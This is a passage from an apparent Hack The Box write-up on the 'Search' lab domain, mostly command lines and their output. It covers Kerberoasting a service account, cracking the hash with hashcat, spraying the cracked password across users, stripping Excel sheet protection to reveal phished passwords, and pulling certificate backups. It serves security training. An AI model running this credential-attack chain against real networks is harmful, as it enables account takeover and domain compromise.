16:04:11 2020</span></span><br><span class="line"><span class="string">  Edith.Walls                        Dc        0  Fri Jul 31 08:39:50 2020</span></span><br><span class="line"><span class="string">  eve.galvan                         Dc        0  Tue Apr  7 14:23:13 2020</span></span><br><span class="line"><span class="string">  frederick.cuevas                   Dc        0  Tue Apr  7 14:29:22 2020</span></span><br><span class="line"><span class="string">  hope.sharp                         Dc        0  Thu Apr  9 10:34:41 2020</span></span><br><span class="line"><span class="string">  jayla.roberts                      Dc        0  Tue Apr  7 14:07:00 2020</span></span><br><span class="line"><span class="string">  Jordan.Gregory                     Dc        0  Fri Jul 31 09:01:06 2020</span></span><br><span class="line"><span class="string">  payton.harmon                      Dc        0  Thu Apr  9 16:11:39 2020</span></span><br><span class="line"><span class="string">  Reginald.Morton                    Dc        0  Fri Jul 31 07:44:32 2020</span></span><br><span class="line"><span class="string">  santino.benjamin                   Dc        0  Tue Apr  7 14:10:25 2020</span></span><br><span class="line"><span class="string">  Savanah.Velazquez                  Dc        0  Fri Jul 31 08:21:42 2020</span></span><br><span class="line"><span class="string">  sierra.frye                        Dc        0  Wed Nov 17 20:01:46 2021</span></span><br><span class="line"><span class="string">  trace.ryan                         Dc        0  Thu Apr  9 16:14:26 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                3246079 blocks of size 4096. 458738 blocks available</span></span><br><span class="line"><span class="string">smb: \&gt;</span></span><br></pre></td></tr></table></figure>

<p>More user information is present in this directory. Let’s add these to user.txt file. We can access Hope users directory, but for the rest we don’t have permission to read or list the contents.</p>
<p>Now we have a valid username and password, we can dump LDAP.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># bloodhound-python -u Hope.Sharp -p &#x27;IsolationIsKey?&#x27; -ns 10.10.11.129 -d search.htb -c All                                  1 ⨯</span></span><br><span class="line">INFO: Found AD domain: search.htb</span><br><span class="line">INFO: Connecting to LDAP server: research.search.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 113 computers</span><br><span class="line">INFO: Connecting to LDAP server: research.search.htb</span><br><span class="line">INFO: Found 106 <span class="built_in">users</span></span><br><span class="line">INFO: Found 63 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: Windows-100.search.htb</span><br><span class="line">INFO: Querying computer: Windows-99.search.htb</span><br><span class="line">INFO: Querying computer: Windows-98.search.htb</span><br><span class="line">INFO: Querying computer: Windows-97.search.htb</span><br><span class="line">INFO: Querying computer: Windows-96.search.htb</span><br><span class="line">INFO: Querying computer: Windows-95.search.htb</span><br><span class="line">INFO: Querying computer: Windows-94.search.htb</span><br><span class="line">INFO: Querying computer: Windows-93.search.htb</span><br><span class="line">INFO: Querying computer: Windows-92.search.htb</span><br><span class="line">INFO: Querying computer: Windows-91.search.htb</span><br><span class="line">----------SNIP----------</span><br></pre></td></tr></table></figure>

<p>We have a vhost, let’s add that to host file. Now we can use this dump to visualize it using bloodhound GUI. Upload all the dumped data.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search.png"></li>
</ul>
<p>This is the shortest path to domain admin. However, we don’t have access to any of the user who are member of ‘ITSEC’. We have access to ‘Hope Sharp’ user but she’s not a member of ITSEC. However, if we look for Kerberoastable Accounts, then we’d find two.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search2.jpg"></li>
</ul>
<p>This ‘Web_svc’ account is created by HelpDesk and it is temporary. It is being used as Web Service, so basically it is a service account.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search3.jpg"></li>
</ul>
<p>The SPN is not null, so we can Kerberoast to extract service account credentials (hash) from Active Directory as a regular user without sending any packets to the target system.</p>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9zd2FybS5wdHNlY3VyaXR5LmNvbS9rZXJiZXJvYXN0aW5nLXdpdGhvdXQtc3Bucy8=">Kerberoasting without SPNs<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search4.jpg"></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/Hope.Sharp:IsolationIsKey?</span></span><br><span class="line">Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation </span><br><span class="line">---------------------------------  -------  --------  --------------------------  ---------  ----------</span><br><span class="line">RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  &lt;never&gt;               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*web_svc<span class="variable">$SEARCH</span>.HTB<span class="variable">$search</span>.htb/web_svc*$4ee5fdd7f42a0f84f9ac17f136b3f069<span class="variable">$01dd7ba8711fd95bdc8360787582d5a4ca21ab2292505d3a3d00343015008eaf0fc7b2151f58f0b91f4f5fc5b18aaae33a5181e98b15951f8fdfa5df0dde76d1f8821b72e0e321993ec8cc7ceed84ac1ec33f85693ef3c204cef1e0dc14221ca3e0308262fb8634e268c56d9ddc44b5368038fed232e669772dc1748a8400e8181c61f065e773a5d5cf37fd036934f6ac77904eb62b1d6ea68f4f86c609053298fb64979293e709f00bf7fe42b2d77c327fc2180c7aec3a01134a1daee99b4134be38879805f576ad0d02818c3e8838720cef5e42f442ea13d6426f47a38c9ad40c106faceae7e20c9773e87870ab4f470da4f3911a1ca476e9e874fa0afcf2395e419db524a69c6013ec760dcc357fdfad8158205d5bce95f1ca6949e53a1be01d168fb23f36c12da34292310054e78a4f85b0291edc28396e01793d79f61edfb66cf95fb91d5fe001062fbf164ddfca6e967edf6b62052055f9fc15205d37437f6689f97fb5de7ec1cf50c71220d60425ed596d95de7583e4650eb401d08020532d1453baf3cfd8a20d8dc1dea9559ad1e9340199160163ada904dcff8a93ffe405e4773bfdd63aa54fee3fe75dda48c4be602b1d519292b3f8525d06f81dced00161c984b2865709f31cee9f7f6cb8eaf4578f98acb594367a1a75ae3ce1e7c30694870c3846ca4a28688863aafb96ebf80c035c6f903ebc29922440b3cbd933d2ffa8cdcb832b15bc65e17f33b03a9e39344face26222797e4858765bb822013822c7b0c16aceb0c69e5d1449561860660aee435e03c25e4e1e56489c5b1c31b159a043e67c10ebade504314ab4a92e6cfaf84265b05b6becf91a9609f67f318b3ca2f5b8bbe48c5c1ee2d2ee5d76808af85711768f70cc6fa44a52709f09a6bf66a1cb0eaaa7a2557d170da2e3f93af61bfe03b4823642f5856fe1f903879dde38e1673412e7acd44feb7b6d56baf2c619344cd255a6211e93997990cc5d9590cba762c818e177cab3e863fb606ef3a59b01cae79245ce48f4adfcb8a2191fdc50e22e0efcbc6f1a32b7d9e01e45a084bc28d16dce196c4764bbb69923a74f74a7979359a4027e4f7b3a6035308b41d35779290c63af219520061a8d135445b4627f6d653dfc782e58f8be41319daff7d11839be8b1cf00d45d2f2edaf38688e88d3e87db5e256ed3af5c00e819e6e17fc68310de406de59271c646279a5c3f300fc85cd514f7840c560a82bb47ead06bc80f031816c7c612058143a83e53bd1826856177bbd53484f9f70a861ad4f3544b2699ee9017e06377f132db59f83e1715b8c7d3b71ecd92e388ce358fa6602c2591d3feff427b7b4c072c0d6d41ef9c0a150ae100a064267a98dc9a3325a33b2b8881a926b8ab88076527e54c153440a51efcaffc1e230e7eebe7259e3d7d826a4eb061a8e2d8a53459fada32331caf5f21a9dd80669e0b88ca9966bd04425ec2e1</span></span><br></pre></td></tr></table></figure>

<p>We got the hash of Web_svc service account. Let’s try to crack it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -m 13100 password.txt rockyou.txt</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*web_svc<span class="variable">$SEARCH</span>.HTB<span class="variable">$search</span>.htb/web_svc*$4ee5fdd7f42a0f84f9ac17f136b3f069<span class="variable">$01dd7ba8711fd95bdc8360787582d5a4ca21ab2292505d3a3d00343015008eaf0fc7b2151f58f0b91f4f5fc5b18aaae33a5181e98b15951f8fdfa5df0dde76d1f8821b72e0e321993ec8cc7ceed84ac1ec33f85693ef3c204cef1e0dc14221ca3e0308262fb8634e268c56d9ddc44b5368038fed232e669772dc1748a8400e8181c61f065e773a5d5cf37fd036934f6ac77904eb62b1d6ea68f4f86c609053298fb64979293e709f00bf7fe42b2d77c327fc2180c7aec3a01134a1daee99b4134be38879805f576ad0d02818c3e8838720cef5e42f442ea13d6426f47a38c9ad40c106faceae7e20c9773e87870ab4f470da4f3911a1ca476e9e874fa0afcf2395e419db524a69c6013ec760dcc357fdfad8158205d5bce95f1ca6949e53a1be01d168fb23f36c12da34292310054e78a4f85b0291edc28396e01793d79f61edfb66cf95fb91d5fe001062fbf164ddfca6e967edf6b62052055f9fc15205d37437f6689f97fb5de7ec1cf50c71220d60425ed596d95de7583e4650eb401d08020532d1453baf3cfd8a20d8dc1dea9559ad1e9340199160163ada904dcff8a93ffe405e4773bfdd63aa54fee3fe75dda48c4be602b1d519292b3f8525d06f81dced00161c984b2865709f31cee9f7f6cb8eaf4578f98acb594367a1a75ae3ce1e7c30694870c3846ca4a28688863aafb96ebf80c035c6f903ebc29922440b3cbd933d2ffa8cdcb832b15bc65e17f33b03a9e39344face26222797e4858765bb822013822c7b0c16aceb0c69e5d1449561860660aee435e03c25e4e1e56489c5b1c31b159a043e67c10ebade504314ab4a92e6cfaf84265b05b6becf91a9609f67f318b3ca2f5b8bbe48c5c1ee2d2ee5d76808af85711768f70cc6fa44a52709f09a6bf66a1cb0eaaa7a2557d170da2e3f93af61bfe03b4823642f5856fe1f903879dde38e1673412e7acd44feb7b6d56baf2c619344cd255a6211e93997990cc5d9590cba762c818e177cab3e863fb606ef3a59b01cae79245ce48f4adfcb8a2191fdc50e22e0efcbc6f1a32b7d9e01e45a084bc28d16dce196c4764bbb69923a74f74a7979359a4027e4f7b3a6035308b41d35779290c63af219520061a8d135445b4627f6d653dfc782e58f8be41319daff7d11839be8b1cf00d45d2f2edaf38688e88d3e87db5e256ed3af5c00e819e6e17fc68310de406de59271c646279a5c3f300fc85cd514f7840c560a82bb47ead06bc80f031816c7c612058143a83e53bd1826856177bbd53484f9f70a861ad4f3544b2699ee9017e06377f132db59f83e1715b8c7d3b71ecd92e388ce358fa6602c2591d3feff427b7b4c072c0d6d41ef9c0a150ae100a064267a98dc9a3325a33b2b8881a926b8ab88076527e54c153440a51efcaffc1e230e7eebe7259e3d7d826a4eb061a8e2d8a53459fada32331caf5f21a9dd80669e0b88ca9966bd04425ec2e1</span>:@3ONEmillionbaby</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)</span><br><span class="line">Hash.Target......: $krb5tgs$23$*web_svc<span class="variable">$SEARCH</span>.HTB<span class="variable">$search</span>.htb/web_svc*...5ec2e1</span><br><span class="line">Time.Started.....: Sat Jan 08 02:00:20 2022 (1 sec)</span><br><span class="line">Time.Estimated...: Sat Jan 08 02:00:21 2022 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........: 14880.9 kH/s (9.10ms) @ Accel:1024 Loops:1 Thr:32 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#3.........:   271.1 kH/s (13.03ms) @ Accel:32 Loops:1 Thr:8 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#*.........: 15152.0 kH/s</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 12828672/14344385 (89.43%)</span><br><span class="line">Rejected.........: 0/12828672 (0.00%)</span><br><span class="line">Restore.Point....: 11214848/14344385 (78.18%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: DR3KSILL0 -&gt; 23~1~19</span></span><br><span class="line">Candidates.<span class="comment">#3....: 2380146112071401 -&gt; 234tjg</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Temp: 59c Util: 29% Core: 528MHz Mem:2279MHz Bus:8</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Sat Jan 08 01:59:54 2022</span><br><span class="line">Stopped: Sat Jan 08 02:00:22 2022</span><br></pre></td></tr></table></figure>

<p>We got the password for web_svc service account, let’s spray this password across all the accounts which we have found so far.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># crackmapexec smb search.htb -u user.txt -p &#x27;@3ONEmillionbaby&#x27; --continue-on-success</span></span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\abril.suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Angie.Duffy:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Antony.Russo:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\belen.compton:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cameron.Melendez:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\chanel.bell:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Claudia.Pugh:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dax.santiago:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Edith.Walls:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\eve.galvan:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\frederick.cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope.sharp:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\jayla.roberts:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jordan.Gregory:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\payton.harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Reginald.Morton:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\santino.benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Savanah.Velazquez:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sierra.frye:@3ONEmillionbaby STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [-] search.htb\trace.ryan:@3ONEmillionbaby STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<p>One user account is using the same password as service account. Let’s look into shares of that user.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># smbclient //search.htb/RedirectedFolders$ -U edgar.jacobs</span></span><br><span class="line">Enter WORKGROUP\edgar.jacobs<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; cd edgar.jacobs\Desktop\</span></span><br><span class="line"><span class="string">smb: \edgar.jacobs\Desktop\&gt; ls</span></span><br><span class="line"><span class="string">  .                                 DRc        0  Mon Aug 10 06:02:16 2020</span></span><br><span class="line"><span class="string">  ..                                DRc        0  Mon Aug 10 06:02:16 2020</span></span><br><span class="line"><span class="string">  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:29 2020</span></span><br><span class="line"><span class="string">  desktop.ini                      AHSc      282  Mon Aug 10 06:02:16 2020</span></span><br><span class="line"><span class="string">  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 16:05:03 2020</span></span><br><span class="line"><span class="string">  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 06:35:44 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                3246079 blocks of size 4096. 458449 blocks available</span></span><br></pre></td></tr></table></figure>

<p>There’s a XLS file, download that to your machine.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/search5.jpg"></li>
</ul>
<p>This XLS document has two sheets, one of them has captured passwords of phishing and another has a list of username. As you can see the lock symbol on second sheet, a column is being locked with a password.</p>
<p>You can confirm it by resizing the cell which is in between lastname and Username. There are two ways to remove the password. Upload it on google drive and access it via sheets, it will remove the password for you. This is the easiest way. If you want to remove it manually, then you need unzip this xlsx file and delete the below link from the sheet2.xml file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;sheetProtection algorithmName=<span class="string">&quot;SHA-512&quot;</span></span><br><span class="line">hashValue=<span class="string">&quot;hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg&quot;</span></span><br><span class="line">saltValue=<span class="string">&quot;U9oZfaVCkz5jWdhs9AA8nA&quot;</span> spinCount=<span class="string">&quot;100000&quot;</span> sheet=<span class="string">&quot;1&quot;</span> objects=<span class="string">&quot;1&quot;</span> scenarios=<span class="string">&quot;1&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>You can find this ‘sheet2.xml’ file after unzipping the xlsx file.<br>Location: xl&#x2F;worksheets&#x2F;sheet2.xml Once you delete that line, you need to zip it back.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r Phishing.xls .</span><br></pre></td></tr></table></figure>

<p>Open the xls file and double click on the line which is between D and B to see the passwords.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">firstname	lastname	password	Username</span><br><span class="line">Payton	Harmon	;;36!cried!INDIA!year!50;;	Payton.Harmon</span><br><span class="line">Cortez	Hickman	..10-time-TALK-proud-66..	Cortez.Hickman</span><br><span class="line">Bobby	Wolf	??47^before^WORLD^surprise^91??	Bobby.Wolf</span><br><span class="line">Margaret	Robinson	//51+mountain+DEAR+noise+83//	Margaret.Robinson</span><br><span class="line">Scarlett	Parks	++47|building|WARSAW|gave|60++	Scarlett.Parks</span><br><span class="line">Eliezer	Jordan	!!05_goes_SEVEN_offer_83!!	Eliezer.Jordan</span><br><span class="line">Hunter	Kirby	~~27%when%VILLAGE%full%00~~	Hunter.Kirby</span><br><span class="line">Sierra	Frye	$<span class="variable">$49</span>=wide=STRAIGHT=jordan=28$<span class="variable">$18</span>	Sierra.Frye</span><br><span class="line">Annabelle	Wells	==95~pass~QUIET~austria~77==	Annabelle.Wells</span><br><span class="line">Eve	Galvan	//61!banker!FANCY!measure!25//	Eve.Galvan</span><br><span class="line">Jeramiah	Fritz	??40:student:MAYOR:been:66??	Jeramiah.Fritz</span><br><span class="line">Abby	Gonzalez	&amp;&amp;75:major:RADIO:state:93&amp;&amp;	Abby.Gonzalez</span><br><span class="line">Joy	Costa	**30*venus*BALL*office*42**	Joy.Costa</span><br><span class="line">Vincent	Sutton	**24&amp;moment&amp;BRAZIL&amp;members&amp;66**	Vincent.Sutton</span><br></pre></td></tr></table></figure>

<p>Now we have 15 more username &amp; passwords. If we look at the bloodhound visual path to domain admin, out of all the users, there are only two are in the password list. Abby and Sierra will lead to domain admin. The Abby password didn’t work, but Sierra’s did.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/search]</span><br><span class="line">└─<span class="comment"># smbclient //search.htb/RedirectedFolders$ -U Sierra.Frye</span></span><br><span class="line">Enter WORKGROUP\Sierra.Frye<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; cd sierra.frye\Desktop\</span></span><br><span class="line"><span class="string">smb: \sierra.frye\Desktop\&gt; ls</span></span><br><span class="line"><span class="string">  .                                 DRc        0  Wed Nov 17 20:08:00 2021</span></span><br><span class="line"><span class="string">  ..                                DRc        0  Wed Nov 17 20:08:00 2021</span></span><br><span class="line"><span class="string">  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 14:03:59 2020</span></span><br><span class="line"><span class="string">  desktop.ini                      AHSc      282  Fri Jul 31 10:42:15 2020</span></span><br><span class="line"><span class="string">  Microsoft Edge.lnk                 Ac     1450  Tue Apr  7 08:28:05 2020</span></span><br><span class="line"><span class="string">  user.txt                           Ac       33  Wed Nov 17 19:55:27 2021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                3246079 blocks of size 4096. 458293 blocks available</span></span><br><span class="line"><span class="string">smb: \sierra.frye\Desktop\&gt; get user.txt</span></span><br><span class="line"><span class="string">getting file \sierra.frye\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/search]</span></span><br><span class="line"><span class="string">└─# cat user.txt   </span></span><br><span class="line"><span class="string">5c7b277e24c9c5a866f572bdff53f0f4</span></span><br></pre></td></tr></table></figure>

<p>We have user flag now.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smb: \sierra.frye\Desktop\&gt; <span class="built_in">cd</span> \sierra.frye\Downloads\Backups\</span><br><span class="line">smb: \sierra.frye\Downloads\Backups\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                 DHc        0  Mon Aug 10 16:39:17 2020</span><br><span class="line">  ..                                DHc        0  Mon Aug 10 16:39:17 2020</span><br><span class="line">  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 11:04:11 2020</span><br><span class="line">  staff.pfx                          Ac     4326  Mon Aug 10 16:39:17 2020</span><br><span class="line"></span><br><span class="line">                3246079 blocks of size 4096. 458293 blocks available</span><br></pre></td></tr></table></figure>

<p>Under Downloads we will find Cryptography files. Let’s download them to our machine.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \sierra.frye\Downloads\Backups\&gt; get search-RESEARCH-CA.p12</span><br><span class="line">getting file \sierra.frye\Downloads\Backups\search-RESEARCH-CA.p12 of size 2643 as search-RESEARCH-CA.p12 (1.7 KiloBytes/sec) (average 1.1 KiloBytes/sec)</span><br><span class="line">smb: \sierra.frye\Downloads\Backups\&gt; get staff.pfx</span><br><span class="line">getting file \sierra.frye\Downloads\Backups\staff.pfx of size 4326 as staff.pfx (5.6 KiloBytes/sec) (average 2.2 KiloBytes/sec)</span><br></pre></td></tr></table></figure>

<p><em><strong>A p12 file contains a digital certificate that uses PKCS#12 (Public Key Cryptography Standard #12) encryption. It is used as a portable format for transferring personal private keys and other sensitive information. P12 files are used by various security and encryption programs. It is generally referred to as a “PFX file”.</strong></em></p>
<p>We can try to upload this certificate to browser (firefox).</p>
<p>It asks for the password. We can try to crack the password using bellow tool.</p>
